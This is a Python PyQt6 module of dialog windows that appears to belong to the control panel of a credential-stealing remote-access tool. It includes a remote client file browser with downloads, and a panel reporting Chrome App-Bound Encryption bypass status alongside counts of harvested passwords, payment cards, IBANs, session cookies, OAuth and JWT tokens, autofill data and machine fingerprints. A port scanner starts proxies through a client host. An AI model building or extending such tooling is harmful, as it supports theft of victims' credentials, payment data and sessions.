from typing import Callable, Dict
import re

from PyQt6 import QtCore, QtGui, QtWidgets

from ..core.i18n import I18n
from ..core.logging import EventLogger
from .proxy_check import ProxyCheckWorker
from .common import GlassFrame, make_button


class StorageDialog(QtWidgets.QDialog):
    def __init__(self, i18n: I18n, logger: EventLogger, client_name: str, parent=None):
        super().__init__(parent)
        self.i18n = i18n
        self.logger = logger
        self.client_name = client_name
        self.last_download_dir = QtCore.QStandardPaths.writableLocation(
            QtCore.QStandardPaths.StandardLocation.DownloadLocation
        )
        self.remote_files = [
            {"name": "Documents", "size": "-", "type": "dir"},
            {"name": "Support_Log.txt", "size": "48 KB", "type": "file"},
            {"name": "Report_Q4.pdf", "size": "1.2 MB", "type": "file"},
            {"name": "Screenshots", "size": "-", "type": "dir"},
        ]

        self.setWindowTitle(self.i18n.t("storage_title"))
        self.setMinimumSize(720, 520)
        layout = QtWidgets.QVBoxLayout(self)

        header = QtWidgets.QHBoxLayout()
        title_box = QtWidgets.QVBoxLayout()
        self.title_label = QtWidgets.QLabel()
        self.title_label.setStyleSheet("font-size: 18px; font-weight: 600;")
        self.subtitle_label = QtWidgets.QLabel()
        self.subtitle_label.setObjectName("Muted")
        title_box.addWidget(self.title_label)
        title_box.addWidget(self.subtitle_label)
        header.addLayout(title_box)
        header.addStretch()
        self.close_button = make_button("", "ghost")
        self.close_button.clicked.connect(self.close)
        header.addWidget(self.close_button)
        layout.addLayout(header)

        body = QtWidgets.QHBoxLayout()
        self.remote_card = GlassFrame(radius=18, tone="card", tint_alpha=170, border_alpha=70)
        self.remote_card.setObjectName("Card")
        remote_layout = QtWidgets.QVBoxLayout(self.remote_card)
        self.remote_title = QtWidgets.QLabel()
        self.remote_title.setStyleSheet("font-weight: 600;")
        remote_layout.addWidget(self.remote_title)

        path_row = QtWidgets.QHBoxLayout()
        self.path_label = QtWidgets.QLabel()
        self.path_input = QtWidgets.QLineEdit(".")
        self.go_button = make_button("", "ghost")
        path_row.addWidget(self.path_label)
        path_row.addWidget(self.path_input, 1)
        path_row.addWidget(self.go_button)
        remote_layout.addLayout(path_row)

        path_actions = QtWidgets.QHBoxLayout()
        self.up_button = make_button("", "ghost")
        self.refresh_button = make_button("", "ghost")
        path_actions.addWidget(self.up_button)
        path_actions.addWidget(self.refresh_button)
        path_actions.addStretch()
        remote_layout.addLayout(path_actions)

        self.remote_table = QtWidgets.QTableWidget(0, 3)
        self.remote_table.verticalHeader().setVisible(False)
        self.remote_table.setAlternatingRowColors(True)
        self.remote_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
        self.remote_table.setEditTriggers(QtWidgets.QAbstractItemView.EditTrigger.NoEditTriggers)
        self.remote_table.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        self.remote_table.setWordWrap(False)
        self.remote_table.verticalHeader().setDefaultSectionSize(40)
        header = self.remote_table.horizontalHeader()
        header.setSectionResizeMode(0, QtWidgets.QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QtWidgets.QHeaderView.ResizeMode.Fixed)
        self.remote_table.setColumnWidth(2, 120)
        remote_layout.addWidget(self.remote_table, 1)

        self.remote_status = QtWidgets.QLabel()
        self.remote_status.setObjectName("Muted")
        remote_layout.addWidget(self.remote_status)

        self.local_card = GlassFrame(radius=18, tone="card", tint_alpha=170, border_alpha=70)
        self.local_card.setObjectName("Card")
        local_layout = QtWidgets.QVBoxLayout(self.local_card)
        self.local_title = QtWidgets.QLabel()
        self.local_title.setStyleSheet("font-weight: 600;")
        local_layout.addWidget(self.local_title)

        self.download_list = QtWidgets.QListWidget()
        local_layout.addWidget(self.download_list, 1)
        self.download_status = QtWidgets.QLabel()
        self.download_status.setObjectName("Muted")
        local_layout.addWidget(self.download_status)

        body.addWidget(self.remote_card, 3)
        body.addWidget(self.local_card, 2)
        layout.addLayout(body, 1)

        self.go_button.clicked.connect(self.refresh_files)
        self.refresh_button.clicked.connect(self.refresh_files)
        self.up_button.clicked.connect(self.move_up)

        self.apply_translations()
        self.refresh_files()

    def apply_translations(self) -> None:
        self.title_label.setText(self.i18n.t("storage_title"))
        self.subtitle_label.setText(self.i18n.t("storage_subtitle"))
        self.remote_title.setText(self.i18n.t("storage_remote_title"))
        self.local_title.setText(self.i18n.t("storage_local_title"))
        self.path_label.setText(self.i18n.t("storage_path_label"))
        self.go_button.setText(self.i18n.t("storage_go"))
        self.up_button.setText(self.i18n.t("storage_up"))
        self.refresh_button.setText(self.i18n.t("storage_refresh"))
        self.close_button.setText(self.i18n.t("storage_close"))
        self.remote_table.setHorizontalHeaderLabels(
            [
                self.i18n.t("table_name"),
                self.i18n.t("storage_size"),
                self.i18n.t("storage_action"),
            ]
        )
        self.remote_status.setText(self.i18n.t("storage_status_idle"))
        self.download_status.setText(self.i18n.t("storage_local_empty"))
        self.setWindowTitle(self.i18n.t("storage_title"))

    def refresh_files(self) -> None:
        self.remote_table.setRowCount(0)
        if not self.remote_files:
            row = self.remote_table.rowCount()
            self.remote_table.insertRow(row)
            item = QtWidgets.QTableWidgetItem(self.i18n.t("storage_empty"))
            item.setFlags(QtCore.Qt.ItemFlag.NoItemFlags)
            self.remote_table.setItem(row, 0, item)
            self.remote_table.setSpan(row, 0, 1, 3)
            return
        for entry in self.remote_files:
            row = self.remote_table.rowCount()
            self.remote_table.insertRow(row)
            self.remote_table.setRowHeight(row, 40)
            name_item = QtWidgets.QTableWidgetItem(entry["name"])
            size_item = QtWidgets.QTableWidgetItem(entry["size"])
            self.remote_table.setItem(row, 0, name_item)
            self.remote_table.setItem(row, 1, size_item)
            action_button = make_button(self.i18n.t("storage_download"), "primary")
            if entry["type"] != "file":
                action_button.setEnabled(False)
            action_button.clicked.connect(
                lambda _, filename=entry["name"]: self.queue_download(filename)
            )
            self.remote_table.setCellWidget(row, 2, action_button)
        self.remote_status.setText(self.i18n.t("storage_status_ready"))

    def move_up(self) -> None:
        self.path_input.setText("..")
        self.refresh_files()

    def queue_download(self, filename: str) -> None:
        start_dir = self.last_download_dir or ""
        folder = QtWidgets.QFileDialog.getExistingDirectory(
            self, self.i18n.t("storage_pick_folder"), start_dir
        )
        if not folder:
            return
        self.last_download_dir = folder
        if self.download_list.count() == 0:
            self.download_list.clear()
        self.download_list.addItem(f"{filename} -> {folder}")
        self.download_status.setText(self.i18n.t("storage_status_ready"))
        self.logger.log("log_storage_download", file=filename, path=folder)


class AddMemberDialog(QtWidgets.QDialog):
    def __init__(self, i18n: I18n, parent=None, allowed_roles: list[str] | None = None):
        super().__init__(parent)
        self.i18n = i18n
        self.setWindowTitle(self.i18n.t("team_add_dialog_title"))
        self.setMinimumWidth(360)
        if allowed_roles is None:
            allowed_roles = ["operator", "administrator", "moderator"]

        layout = QtWidgets.QVBoxLayout(self)
        form = QtWidgets.QFormLayout()

        self.name_input = QtWidgets.QLineEdit()
        self.account_input = QtWidgets.QLineEdit()
        self.password_input = QtWidgets.QLineEdit()
        self.password_input.setEchoMode(QtWidgets.QLineEdit.EchoMode.Password)
        self.tag_combo = QtWidgets.QComboBox()
        if "operator" in allowed_roles:
            self.tag_combo.addItem(self.i18n.t("tag_operator"), "operator")
        if "administrator" in allowed_roles:
            self.tag_combo.addItem(self.i18n.t("tag_administrator"), "administrator")
        if "moderator" in allowed_roles:
            self.tag_combo.addItem(self.i18n.t("tag_moderator"), "moderator")

        form.addRow(self.i18n.t("team_add_name"), self.name_input)
        form.addRow(self.i18n.t("team_add_account_id"), self.account_input)
        form.addRow(self.i18n.t("team_add_password"), self.password_input)
        form.addRow(self.i18n.t("team_add_tag"), self.tag_combo)
        layout.addLayout(form)

        buttons = QtWidgets.QHBoxLayout()
        buttons.addStretch()
        self.cancel_button = make_button(self.i18n.t("team_add_cancel"), "ghost")
        self.confirm_button = make_button(self.i18n.t("team_add_confirm"), "primary")
        self.cancel_button.clicked.connect(self.reject)
        self.confirm_button.clicked.connect(self.accept)
        buttons.addWidget(self.cancel_button)
        buttons.addWidget(self.confirm_button)
        layout.addLayout(buttons)

    def member_data(self) -> Dict[str, str]:
        return {
            "name": self.name_input.text().strip(),
            "account_id": self.account_input.text().strip(),
            "password": self.password_input.text(),
            "tag": self.tag_combo.currentData(),
        }


class EditMemberDialog(QtWidgets.QDialog):
    def __init__(
        self,
        i18n: I18n,
        member: dict,
        parent=None,
        allowed_roles: list[str] | None = None,
    ):
        super().__init__(parent)
        self.i18n = i18n
        self.member = member or {}
        self.setWindowTitle(self.i18n.t("team_edit_dialog_title"))
        self.setMinimumWidth(360)

        layout = QtWidgets.QVBoxLayout(self)
        form = QtWidgets.QFormLayout()

        self.name_input = QtWidgets.QLineEdit(str(self.member.get("name") or ""))
        self.account_input = QtWidgets.QLineEdit(str(self.member.get("account_id") or ""))
        self.password_input = QtWidgets.QLineEdit()
        self.password_input.setEchoMode(QtWidgets.QLineEdit.EchoMode.Password)
        self.password_input.setPlaceholderText(self.i18n.t("team_edit_password_placeholder"))

        self.tag_combo = QtWidgets.QComboBox()
        roles = list(allowed_roles or ["operator", "administrator", "moderator"])
        current_role = str(self.member.get("tag") or "operator")
        if current_role and current_role not in roles:
            roles.append(current_role)
        for role in roles:
            key = f"tag_{role}"
            label = self.i18n.t(key)
            if label == key:
                label = role
            self.tag_combo.addItem(label, role)
        index = self.tag_combo.findData(current_role)
        if index >= 0:
            self.tag_combo.setCurrentIndex(index)
        if allowed_roles is not None and len(allowed_roles) <= 1:
            self.tag_combo.setEnabled(False)

        form.addRow(self.i18n.t("team_add_name"), self.name_input)
        form.addRow(self.i18n.t("team_add_account_id"), self.account_input)
        form.addRow(self.i18n.t("team_add_password"), self.password_input)
        form.addRow(self.i18n.t("team_add_tag"), self.tag_combo)
        layout.addLayout(form)

        buttons = QtWidgets.QHBoxLayout()
        buttons.addStretch()
        self.cancel_button = make_button(self.i18n.t("team_edit_cancel"), "ghost")
        self.confirm_button = make_button(self.i18n.t("team_edit_confirm"), "primary")
        self.cancel_button.clicked.connect(self.reject)
        self.confirm_button.clicked.connect(self.accept)
        buttons.addWidget(self.cancel_button)
        buttons.addWidget(self.confirm_button)
        layout.addLayout(buttons)

    def member_data(self) -> Dict[str, str]:
        return {
            "name": self.name_input.text().strip(),
            "account_id": self.account_input.text().strip(),
            "password": self.password_input.text(),
            "tag": self.tag_combo.currentData(),
        }


class AbeDiagnosticsDialog(QtWidgets.QDialog):
    def __init__(self, i18n: I18n, payload: dict | None = None, parent=None):
        super().__init__(parent)
        self.i18n = i18n
        self.payload = payload or {}

        self.setObjectName("AbeDiagnosticsDialog")
        self.setWindowTitle(self.i18n.t("abe_diagnostics_title"))
        self.setMinimumWidth(520)
        self.setMinimumHeight(600)

        layout = QtWidgets.QVBoxLayout(self)
        layout.setContentsMargins(14, 14, 14, 14)
        layout.setSpacing(12)

        title = QtWidgets.QLabel(self.i18n.t("abe_diagnostics_title"))
        title.setObjectName("AbeDialogTitle")
        layout.addWidget(title)

        # Scroll area for content
        scroll = QtWidgets.QScrollArea()
        scroll.setObjectName("AbeDiagnosticsScroll")
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QtWidgets.QFrame.Shape.NoFrame)
        scroll.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll.setAutoFillBackground(False)
        scroll.viewport().setObjectName("AbeDiagnosticsViewport")
        scroll.viewport().setAutoFillBackground(False)
        scroll_content = QtWidgets.QWidget()
        scroll_content.setObjectName("AbeDiagnosticsContent")
        scroll_content.setAutoFillBackground(False)
        scroll_layout = QtWidgets.QVBoxLayout(scroll_content)
        scroll_layout.setContentsMargins(4, 4, 4, 4)
        scroll_layout.setSpacing(16)

        # === ABE Status Section ===
        abe_form = QtWidgets.QFormLayout()
        abe_form.setLabelAlignment(QtCore.Qt.AlignmentFlag.AlignLeft)
        abe_form.setFormAlignment(QtCore.Qt.AlignmentFlag.AlignLeft)
        abe_form.setHorizontalSpacing(20)
        abe_form.setVerticalSpacing(8)

        self._add_bool_row(abe_form, "abe_diag_windows", self.payload.get("windows"))
        self._add_bool_row(abe_form, "abe_diag_chrome", self.payload.get("chrome_installed"))
        self._add_bool_row(abe_form, "abe_diag_elevation", self.payload.get("elevation_service"))
        self._add_bool_row(abe_form, "abe_diag_dpapi", self.payload.get("dpapi_available"))
        self._add_bool_row(abe_form, "abe_diag_ielevator", self.payload.get("ielevator_available"))

        abe_form.addRow(QtWidgets.QLabel(""), QtWidgets.QLabel(""))

        abe_form.addRow(
            self._label("abe_diag_version"),
            self._value(self._resolve_version_text()),
        )
        abe_form.addRow(
            self._label("abe_diag_cookies_v20"),
            self._value(self._resolve_v20_text()),
        )
        abe_form.addRow(
            self._label("abe_diag_success_rate"),
            self._value(self._resolve_success_text()),
        )

        scroll_layout.addLayout(abe_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Passwords Section ===
        scroll_layout.addWidget(self._section_title("abe_diag_passwords_title"))

        passwords_form = QtWidgets.QFormLayout()
        passwords_form.setHorizontalSpacing(20)
        passwords_form.setVerticalSpacing(6)
        passwords_data = self.payload.get("passwords") or {}
        passwords_form.addRow(
            self._label("abe_diag_passwords_total"),
            self._value(str(passwords_data.get("total", 0))),
        )
        passwords_form.addRow(
            self._label("abe_diag_passwords_encrypted"),
            self._value(str(passwords_data.get("encrypted", 0))),
        )
        domains = passwords_data.get("domains") or []
        if domains:
            passwords_form.addRow(
                self._label("abe_diag_passwords_domains"),
                self._value(", ".join(domains[:5]) + ("..." if len(domains) > 5 else ""), wrap=True),
            )
        scroll_layout.addLayout(passwords_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Payment Methods Section ===
        scroll_layout.addWidget(self._section_title("abe_diag_payment_title"))

        payment_form = QtWidgets.QFormLayout()
        payment_form.setHorizontalSpacing(20)
        payment_form.setVerticalSpacing(6)
        payment_data = self.payload.get("payment_methods") or {}
        payment_form.addRow(
            self._label("abe_diag_cards"),
            self._value(str(payment_data.get("cards", 0))),
        )
        card_types = payment_data.get("card_types") or []
        if card_types:
            payment_form.addRow(
                self._label("abe_diag_card_types"),
                self._value(", ".join(card_types)),
            )
        payment_form.addRow(
            self._label("abe_diag_ibans"),
            self._value(str(payment_data.get("ibans", 0))),
        )
        scroll_layout.addLayout(payment_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Tokens Section ===
        scroll_layout.addWidget(self._section_title("abe_diag_tokens_title"))

        tokens_form = QtWidgets.QFormLayout()
        tokens_form.setHorizontalSpacing(20)
        tokens_form.setVerticalSpacing(6)
        tokens_data = self.payload.get("tokens") or {}
        tokens_form.addRow(
            self._label("abe_diag_session_cookies"),
            self._value(str(tokens_data.get("session_cookies", 0))),
        )
        tokens_form.addRow(
            self._label("abe_diag_auth_tokens"),
            self._value(str(tokens_data.get("auth_tokens", 0))),
        )
        tokens_form.addRow(
            self._label("abe_diag_oauth_tokens"),
            self._value(str(tokens_data.get("oauth_tokens", 0))),
        )
        tokens_form.addRow(
            self._label("abe_diag_jwt_tokens"),
            self._value(str(tokens_data.get("jwt_tokens", 0))),
        )
        services = tokens_data.get("services") or []
        if services:
            tokens_form.addRow(
                self._label("abe_diag_services"),
                self._value(", ".join(services[:10]) + ("..." if len(services) > 10 else ""), wrap=True),
            )
        scroll_layout.addLayout(tokens_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Fingerprint Section ===
        scroll_layout.addWidget(self._section_title("abe_diag_fingerprint_title"))

        fingerprint_form = QtWidgets.QFormLayout()
        fingerprint_form.setHorizontalSpacing(20)
        fingerprint_form.setVerticalSpacing(6)
        fingerprint_data = self.payload.get("fingerprint") or {}
        fingerprint_form.addRow(
            self._label("abe_diag_machine_id"),
            self._value(str(fingerprint_data.get("machine_id") or "--")),
        )
        fingerprint_form.addRow(
            self._label("abe_diag_client_id"),
            self._value(str(fingerprint_data.get("client_id") or "--")),
        )
        fingerprint_form.addRow(
            self._label("abe_diag_profile_id"),
            self._value(str(fingerprint_data.get("profile_id") or "--")),
        )
        scroll_layout.addLayout(fingerprint_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Autofill Section ===
        scroll_layout.addWidget(self._section_title("abe_diag_autofill_title"))

        autofill_form = QtWidgets.QFormLayout()
        autofill_form.setHorizontalSpacing(20)
        autofill_form.setVerticalSpacing(6)
        autofill_data = self.payload.get("autofill") or {}
        autofill_form.addRow(
            self._label("abe_diag_autofill_entries"),
            self._value(str(autofill_data.get("entries", 0))),
        )
        autofill_form.addRow(
            self._label("abe_diag_autofill_addresses"),
            self._value(str(autofill_data.get("addresses", 0))),
        )
        autofill_form.addRow(
            self._label("abe_diag_autofill_profiles"),
            self._value(str(autofill_data.get("profiles", 0))),
        )
        scroll_layout.addLayout(autofill_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Recommendation ===
        rec_form = QtWidgets.QFormLayout()
        rec_form.setHorizontalSpacing(20)
        rec_form.addRow(
            self._label("abe_diag_recommendation"),
            self._value(self._resolve_recommendation_text(), wrap=True),
        )
        scroll_layout.addLayout(rec_form)

        scroll_layout.addStretch()
        scroll.setWidget(scroll_content)
        layout.addWidget(scroll, 1)

        # Buttons
        buttons = QtWidgets.QHBoxLayout()
        buttons.addStretch()
        self.copy_button = make_button(self.i18n.t("abe_diag_copy"), "ghost")
        self.close_button = make_button(self.i18n.t("abe_diag_close"), "primary")
        self.copy_button.clicked.connect(self._copy_summary)
        self.close_button.clicked.connect(self.accept)
        buttons.addWidget(self.copy_button)
        buttons.addWidget(self.close_button)
        layout.addLayout(buttons)

    def _separator(self) -> QtWidgets.QFrame:
        line = QtWidgets.QFrame()
        line.setObjectName("AbeSeparator")
        line.setFrameShape(QtWidgets.QFrame.Shape.HLine)
        line.setFixedHeight(1)
        return line

    def _section_title(self, key: str) -> QtWidgets.QLabel:
        label = QtWidgets.QLabel(self.i18n.t(key))
        label.setObjectName("CardSectionTitle")
        return label

    def _label(self, key: str) -> QtWidgets.QLabel:
        label = QtWidgets.QLabel(self.i18n.t(key))
        label.setObjectName("DetailLabel")
        return label

    def _value(self, text: str, wrap: bool = False) -> QtWidgets.QLabel:
        label = QtWidgets.QLabel(text)
        label.setObjectName("DetailValue")
        label.setWordWrap(wrap)
        return label

    def _format_bool(self, value: object) -> tuple[str, str]:
        if value is True:
            return self.i18n.t("proxy_bool_yes"), "ok"
        if value is False:
            return self.i18n.t("proxy_bool_no"), "bad"
        return "--", "na"

    def _add_bool_row(self, form: QtWidgets.QFormLayout, key: str, value: object) -> None:
        label = self._label(key)
        text, state = self._format_bool(value)
        value_label = self._value(text)
        value_label.setObjectName("AbeBoolValue")
        value_label.setProperty("state", state)
        form.addRow(label, value_label)

    def _resolve_version_text(self) -> str:
        chrome_version = self.payload.get("chrome_version")
        if chrome_version:
            if self.payload.get("detected"):
                return f"Chrome {chrome_version} (ABE/APPB)"
            return f"Chrome {chrome_version}"
        if self.payload.get("detected"):
            return "APPB (Chrome 127+)"
        return "--"

    def _resolve_v20_text(self) -> str:
        total = self.payload.get("cookies_total")
        v20 = self.payload.get("cookies_v20")
        if isinstance(total, int) and isinstance(v20, int):
            return f"{v20} / {total}"
        return "--"

    def _resolve_success_text(self) -> str:
        value = self.payload.get("success_rate")
        if isinstance(value, (int, float)):
            return f"{value:.0f}%"
        return "--"

    def _resolve_recommendation_text(self) -> str:
        recommendation = str(self.payload.get("recommendation") or "").strip()
        return recommendation or "--"

    def _copy_summary(self) -> None:
        lines = [
            "=== ABE Status ===",
            f"{self.i18n.t('abe_diag_windows')}: {self._format_bool(self.payload.get('windows'))[0]}",
            f"{self.i18n.t('abe_diag_chrome')}: {self._format_bool(self.payload.get('chrome_installed'))[0]}",
            f"{self.i18n.t('abe_diag_elevation')}: {self._format_bool(self.payload.get('elevation_service'))[0]}",
            f"{self.i18n.t('abe_diag_dpapi')}: {self._format_bool(self.payload.get('dpapi_available'))[0]}",
            f"{self.i18n.t('abe_diag_ielevator')}: {self._format_bool(self.payload.get('ielevator_available'))[0]}",
            f"{self.i18n.t('abe_diag_version')}: {self._resolve_version_text()}",
            f"{self.i18n.t('abe_diag_cookies_v20')}: {self._resolve_v20_text()}",
            f"{self.i18n.t('abe_diag_success_rate')}: {self._resolve_success_text()}",
            "",
            "=== Passwords ===",
        ]
        passwords_data = self.payload.get("passwords") or {}
        lines.append(f"{self.i18n.t('abe_diag_passwords_total')}: {passwords_data.get('total', 0)}")
        lines.append(f"{self.i18n.t('abe_diag_passwords_encrypted')}: {passwords_data.get('encrypted', 0)}")
        
        lines.append("")
        lines.append("=== Payment Methods ===")
        payment_data = self.payload.get("payment_methods") or {}
        lines.append(f"{self.i18n.t('abe_diag_cards')}: {payment_data.get('cards', 0)}")
        lines.append(f"{self.i18n.t('abe_diag_ibans')}: {payment_data.get('ibans', 0)}")
        
        lines.append("")
        lines.append("=== Tokens ===")
        tokens_data = self.payload.get("tokens") or {}
        lines.append(f"{self.i18n.t('abe_diag_session_cookies')}: {tokens_data.get('session_cookies', 0)}")
        lines.append(f"{self.i18n.t('abe_diag_auth_tokens')}: {tokens_data.get('auth_tokens', 0)}")
        lines.append(f"{self.i18n.t('abe_diag_oauth_tokens')}: {tokens_data.get('oauth_tokens', 0)}")
        lines.append(f"{self.i18n.t('abe_diag_jwt_tokens')}: {tokens_data.get('jwt_tokens', 0)}")
        
        lines.append("")
        lines.append("=== Fingerprint ===")
        fingerprint_data = self.payload.get("fingerprint") or {}
        lines.append(f"{self.i18n.t('abe_diag_machine_id')}: {fingerprint_data.get('machine_id') or '--'}")
        lines.append(f"{self.i18n.t('abe_diag_client_id')}: {fingerprint_data.get('client_id') or '--'}")
        
        lines.append("")
        lines.append(f"{self.i18n.t('abe_diag_recommendation')}: {self._resolve_recommendation_text()}")
        
        QtWidgets.QApplication.clipboard().setText("\n".join(lines))


class ProxyPortDialog(QtWidgets.QDialog):
    def __init__(
        self,
        i18n: I18n,
        host: str,
        ports: list[int] | None,
        start_proxy: Callable[[int, bool, bool], None],
        stop_proxy: Callable[[], None],
        parent=None,
    ):
        super().__init__(parent)
        self.i18n = i18n
        self._host = (host or "").strip()
        self._start_proxy = start_proxy
        self._stop_proxy = stop_proxy
        self._default_ports = ports or [1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088]
        self._scan_ports: list[int] = []
        self._scan_index = 0
        self._scan_active = False
        self._row_map: dict[int, int] = {}
        self._port_status: dict[int, bool] = {}
        self._check_worker: ProxyCheckWorker | None = None
        self._current_port: int | None = None

        self.setWindowTitle(self.i18n.t("proxy_ports_title"))
        self.setMinimumWidth(520)

        layout = QtWidgets.QVBoxLayout(self)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(12)

        title = QtWidgets.QLabel(self.i18n.t("proxy_ports_title"))
        title.setObjectName("CardSectionTitle")
        subtitle = QtWidgets.QLabel(self.i18n.t("proxy_ports_subtitle"))
        subtitle.setObjectName("Muted")
        subtitle.setWordWrap(True)
        layout.addWidget(title)
        layout.addWidget(subtitle)

        host_row = QtWidgets.QHBoxLayout()
        host_label = QtWidgets.QLabel(self.i18n.t("proxy_host_label"))
        host_label.setObjectName("DetailLabel")
        self.host_value = QtWidgets.QLabel(self._host or "--")
        self.host_value.setObjectName("DetailValue")
        host_row.addWidget(host_label)
        host_row.addWidget(self.host_value, 1)
        layout.addLayout(host_row)

        ports_row = QtWidgets.QHBoxLayout()
        ports_label = QtWidgets.QLabel(self.i18n.t("proxy_ports_label"))
        ports_label.setObjectName("DetailLabel")
        self.ports_input = QtWidgets.QLineEdit()
        self.ports_input.setText(",".join(str(p) for p in self._default_ports))
        self.scan_button = make_button(self.i18n.t("proxy_ports_scan"), "ghost")
        self.scan_button.clicked.connect(self._start_scan)
        ports_row.addWidget(ports_label)
        ports_row.addWidget(self.ports_input, 1)
        ports_row.addWidget(self.scan_button)
        layout.addLayout(ports_row)

        self.table = QtWidgets.QTableWidget(0, 2)
        self.table.verticalHeader().setVisible(False)
        self.table.setAlternatingRowColors(True)
        self.table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setEditTriggers(QtWidgets.QAbstractItemView.EditTrigger.NoEditTriggers)
        self.table.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        self.table.verticalHeader().setDefaultSectionSize(36)
        header = self.table.horizontalHeader()
        header.setSectionResizeMode(0, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QtWidgets.QHeaderView.ResizeMode.Stretch)
        self.table.setHorizontalHeaderLabels(
            [
                self.i18n.t("proxy_port_label"),
                self.i18n.t("proxy_status_label"),
            ]
        )
        self.table.itemSelectionChanged.connect(self._update_controls)
        layout.addWidget(self.table, 1)

        self.status_label = QtWidgets.QLabel(self.i18n.t("proxy_check_pending"))
        self.status_label.setObjectName("Muted")
        layout.addWidget(self.status_label)

        buttons = QtWidgets.QHBoxLayout()
        buttons.addStretch()
        self.cancel_button = make_button(self.i18n.t("storage_close"), "ghost")
        self.confirm_button = make_button(self.i18n.t("proxy_ports_use"), "primary")
        self.cancel_button.clicked.connect(self.reject)
        self.confirm_button.clicked.connect(self._confirm_selection)
        buttons.addWidget(self.cancel_button)
        buttons.addWidget(self.confirm_button)
        layout.addLayout(buttons)

        self._populate_table(self._default_ports)
        self._update_controls()
        QtCore.QTimer.singleShot(0, self._start_scan)

    def _parse_ports(self) -> list[int]:
        raw = self.ports_input.text()
        tokens = re.split(r"[\\s,;]+", raw or "")
        ports: list[int] = []
        for token in tokens:
            token = token.strip()
            if not token:
                continue
            try:
                value = int(token)
            except ValueError:
                continue
            if 1 <= value <= 65535 and value not in ports:
                ports.append(value)
        return ports or list(self._default_ports)

    def _populate_table(self, ports: list[int]) -> None:
        self.table.setRowCount(0)
        self._row_map = {}
        self._port_status = {}
        for port in ports:
            row = self.table.rowCount()
            self.table.insertRow(row)
            port_item = QtWidgets.QTableWidgetItem(str(port))
            status_item = QtWidgets.QTableWidgetItem(self.i18n.t("proxy_check_pending"))
            port_item.setFlags(port_item.flags() & ~QtCore.Qt.ItemFlag.ItemIsEditable)
            status_item.setFlags(status_item.flags() & ~QtCore.Qt.ItemFlag.ItemIsEditable)
            self.table.setItem(row, 0, port_item)
            self.table.setItem(row, 1, status_item)
            self._row_map[port] = row

    def _set_port_status(self, port: int, text: str) -> None:
        row = self._row_map.get(port)
        if row is None:
            return
        item = self.table.item(row, 1)
        if item:
            item.setText(text)

    def _start_scan(self) -> None:
        if not self._host:
            QtWidgets.QMessageBox.warning(
                self,
                self.i18n.t("proxy_ports_title"),
                self.i18n.t("proxy_status_disabled"),
            )
            return
        if self._scan_active:
            return
        ports = self._parse_ports()
        self._populate_table(ports)
        self._scan_ports = ports
        self._scan_index = 0
        self._scan_active = True
        self._update_controls()
        self._scan_next()

    def _scan_next(self) -> None:
        if self._scan_index >= len(self._scan_ports):
            self._scan_active = False
            self.status_label.setText(self.i18n.t("proxy_check_ok"))
            self._update_controls()
            return
        port = self._scan_ports[self._scan_index]
        self._current_port = port
        self._set_port_status(port, self.i18n.t("proxy_checking"))
        self.status_label.setText(
            f"{self.i18n.t('proxy_checking')} {port} ({self._scan_index + 1}/{len(self._scan_ports)})"
        )
        self._start_proxy(port, True, True)
        QtCore.QTimer.singleShot(650, lambda: self._start_check(port))

    def _start_check(self, port: int) -> None:
        if self._check_worker and self._check_worker.isRunning():
            return
        worker = ProxyCheckWorker(str(port), self._host, port)
        worker.finished.connect(self._handle_check_finished)
        self._check_worker = worker
        worker.start()

    def _handle_check_finished(self, port_id: str, ok: bool, detail: str, latency_ms: int) -> None:
        try:
            port = int(port_id)
        except (TypeError, ValueError):
            port = self._current_port or 0
        if ok:
            status = f"{self.i18n.t('proxy_check_ok')} ({latency_ms} ms)"
        else:
            suffix = detail.strip() if isinstance(detail, str) else ""
            status = self.i18n.t("proxy_check_failed")
            if suffix:
                status = f"{status}: {suffix}"
        if port:
            self._set_port_status(port, status)
            self._port_status[port] = ok
        self._check_worker = None
        try:
            self._stop_proxy()
        except Exception:
            pass
        self._scan_index += 1
        QtCore.QTimer.singleShot(120, self._scan_next)

    def _selected_port(self) -> int | None:
        items = self.table.selectedItems()
        if not items:
            return None
        row = items[0].row()
        item = self.table.item(row, 0)
        if not item:
            return None
        try:
            return int(item.text())
        except ValueError:
            return None

    def _confirm_selection(self) -> None:
        port = self._selected_port()
        if port is None:
            return
        self._start_proxy(port, True, True)
        self.accept()

    def _update_controls(self) -> None:
        selected = self._selected_port()
        ok = bool(selected and self._port_status.get(selected))
        self.confirm_button.setEnabled(bool(ok and not self._scan_active))
        self.scan_button.setEnabled(not self._scan_active)
